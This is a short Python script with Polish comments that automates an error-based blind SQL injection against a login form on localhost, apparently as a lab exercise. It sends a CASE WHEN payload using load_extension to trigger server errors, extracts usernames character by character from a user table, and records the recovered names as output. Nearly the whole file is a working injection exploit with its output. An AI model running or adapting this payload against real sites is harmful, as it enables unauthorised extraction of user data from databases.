import requests
import string

# można zoptymalizować ale mi się nie chciało, dzielić na pół poprzez <> szybciej by szukało, ja sobie przeszukam cały alfabet
verbose = False
def iterate_letters(letter_nr, word_nr):
    url = 'http://localhost:5000'
    aplhabet = list(string.ascii_lowercase)
    for l in aplhabet:
            myobj = {'username': f'costam\' or CASE WHEN (Select hex(substr(username,{letter_nr+1},1)) from user limit {word_nr+1} offset {word_nr}) = hex(\'{l}\') THEN 1 ELSE load_extension(1) END--', 'password': ''}
            x = requests.post(url, data = myobj)

            if x.status_code != 500:
                if verbose:
                    print(l)
                return l
    return -1

def find_word(word_nr):
    word = ''
    how_many_letters = 0
    while True:
        l = iterate_letters(how_many_letters, word_nr)
        if l == -1:
            return word
        word += l
        how_many_letters = how_many_letters + 1

words = []
how_many_words = 0

while True:
    word = find_word(how_many_words)
    if word == '':
        break
    words.append(word)
    how_many_words = how_many_words + 1

print(words)


# bardzo długo się wykonuje co jest zrozumiałe przez brak optymalizacji
# ['bach', 'john', 'bob'] <- output

